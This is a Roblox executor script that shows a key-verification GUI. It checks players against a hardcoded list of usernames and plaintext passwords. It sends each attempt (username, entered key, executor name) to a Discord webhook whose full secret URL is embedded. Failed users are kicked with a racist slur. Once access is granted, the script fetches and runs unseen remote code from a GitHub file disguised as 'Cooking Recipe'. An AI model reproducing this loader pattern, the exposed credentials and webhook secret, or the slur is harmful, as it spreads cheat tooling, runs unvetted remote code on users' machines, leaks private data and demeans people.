local allowedUsers = {
    ["J89DA9GX6O"] = "admin",
    ["pleasegimmeerwin"] = "stinkyfart32",
    ["cameronherbst"] = "Cam1226",
    ["Mahmutkrsgl"] = "1903",
    ["Mercy_emo"] = "1904",
    ["asyakrsgl"] = "1905",
    ["evlpne"] = "chickenfart234",
    ["hsyweei12345"] = "0107",
    ["Vofzzz"] = "Dominicano",
    ["gocrazyjay0"] = "Jordan21",
    ["KronicIz"] = "Mcboss413",
    ["zxytoxd"] = "oompaloompa",
    ["SebastianDuckMaster"] = "oompaloompa",
    ["BrooklynHaze12"] = "Poppaishere",
    ["yrnk_hov2"] = "ASTRO",
    ["lebronjammes38"] = "lebronking33",
    ["benn_kaz"] = "null",
    ["null"] = "sikicikanye",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
    ["null"] = "null",
}

local loggingWebhook = "https://discord.com/api/webhooks/1371245432247681128/P3WlGe61QkaITnJiiVl0ALLvRaBRF3S00b-RPSx1vYyH3KvWkZvtSzp7eS4rAH6EtvOz"  -- Replace with your webhook URL

local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

-- Blur effect
local blur = Instance.new("BlurEffect", game:GetService("Lighting"))
blur.Size = 0
TweenService:Create(blur, TweenInfo.new(0.5), {Size = 12}):Play()

-- GUI
local KeyGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
KeyGUI.Name = "KeyAuthGUI"
KeyGUI.ResetOnSpawn = false

local frame = Instance.new("Frame", KeyGUI)
frame.Size = UDim2.new(0, 380, 0, 260)
frame.Position = UDim2.new(0.5, -190, 0.5, -130)
frame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
frame.BackgroundTransparency = 1
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 0.1}):Play()

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -40, 0, 50)
title.Position = UDim2.new(0, 20, 0, 10)
title.Text = "🔐 Key Verification"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", frame)
closeBtn.Text = "✕"
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 18
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)

closeBtn.MouseEnter:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 30, 30)}):Play()
end)

closeBtn.MouseLeave:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(255, 80, 80)}):Play()
end)

closeBtn.MouseButton1Click:Connect(function()
    TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
    TweenService:Create(blur, TweenInfo.new(0.3), {Size = 0}):Play()
    wait(0.3)
    KeyGUI:Destroy()
    blur:Destroy()
end)

local keyInput = Instance.new("TextBox", frame)
keyInput.Size = UDim2.new(0.85, 0, 0, 40)
keyInput.Position = UDim2.new(0.075, 0, 0, 80)
keyInput.PlaceholderText = "Enter your access key..."
keyInput.ClearTextOnFocus = true
keyInput.TextInputType = Enum.TextInputType.Password
keyInput.Font = Enum.Font.Gotham
keyInput.TextSize = 18
keyInput.TextColor3 = Color3.fromRGB(0, 0, 0)
keyInput.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
Instance.new("UICorner", keyInput).CornerRadius = UDim.new(0, 10)

local submitBtn = Instance.new("TextButton", frame)
submitBtn.Size = UDim2.new(0.85, 0, 0, 40)
submitBtn.Position = UDim2.new(0.075, 0, 0, 145)
submitBtn.Text = "Verify Key"
submitBtn.Font = Enum.Font.GothamBold
submitBtn.TextSize = 20
submitBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 10)

submitBtn.MouseEnter:Connect(function()
    TweenService:Create(submitBtn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(0, 140, 230)}):Play()
end)
submitBtn.MouseLeave:Connect(function()
    TweenService:Create(submitBtn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(0, 170, 255)}):Play()
end)

submitBtn.MouseButton1Click:Connect(function()
    TweenService:Create(submitBtn, TweenInfo.new(0.1), {Size = UDim2.new(0.83, 0, 0, 38)}):Play()
    wait(0.1)
    TweenService:Create(submitBtn, TweenInfo.new(0.1), {Size = UDim2.new(0.85, 0, 0, 40)}):Play()

    local actualName = player.Name
    local enteredKey = keyInput.Text
    local correctKey = allowedUsers[actualName]
    local keyIsValid = (correctKey == enteredKey)

    sendLoginLog(actualName, enteredKey, keyIsValid)

    if not keyIsValid then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Access Denied",
            Text = "Invalid key for your username.",
            Duration = 4
        })
        wait(2)
        player:Kick("Access Denied: Incorrect Key, What you trying to do Black Nigger?.")
        return
    end

    showAccessGranted()
end)

function sendLoginLog(username, key, success)
    local status = success and "✅ Access Granted" or "❌ Access Denied"
    local color = success and 0x00FF00 or 0xFF0000

    local embed = {
        ["title"] = "🔐 Key Attempt",
        ["description"] = status,
        ["color"] = color,
        ["fields"] = {
            {["name"] = "Username", ["value"] = username},
            {["name"] = "Entered Key", ["value"] = key},
            {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Unknown"}
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local data = {
        ["embeds"] = {embed}
    }

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local body = HttpService:JSONEncode(data)

    local success, err = pcall(function()
        local request = http_request or request or syn.request
        request({
            Url = loggingWebhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end)

    if not success then
        warn("Webhook failed to send:", err)
    end
end

function showAccessGranted()
    -- Access Granted GUI
    local grantedFrame = Instance.new("Frame", KeyGUI)
    grantedFrame.Size = UDim2.new(0, 300, 0, 100)
    grantedFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
    grantedFrame.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    grantedFrame.BackgroundTransparency = 1
    Instance.new("UICorner", grantedFrame).CornerRadius = UDim.new(0, 10)

    local grantedLabel = Instance.new("TextLabel", grantedFrame)
    grantedLabel.Size = UDim2.new(1, 0, 1, 0)
    grantedLabel.BackgroundTransparency = 1
    grantedLabel.Text = "✅ Access Granted"
    grantedLabel.Font = Enum.Font.GothamBlack
    grantedLabel.TextSize = 28
    grantedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    local sound = Instance.new("Sound", player:WaitForChild("PlayerGui"))
    sound.SoundId = "rbxassetid://237877850"  -- Half-Life 1 Elevator Ding
    sound.Volume = 1
    sound:Play()

    TweenService:Create(grantedFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0.1}):Play()
    wait(2)
    TweenService:Create(grantedFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    wait(0.4)
    grantedFrame:Destroy()
    sound:Destroy()

    TweenService:Create(frame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
    TweenService:Create(blur, TweenInfo.new(0.4), {Size = 0}):Play()
    wait(0.5)
    KeyGUI:Destroy()
    blur:Destroy()

    -- Load and execute the external script after access is granted
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SemionInThesius/Cooking-Recipe/refs/heads/main/Cooking%20Recipe"))()
end
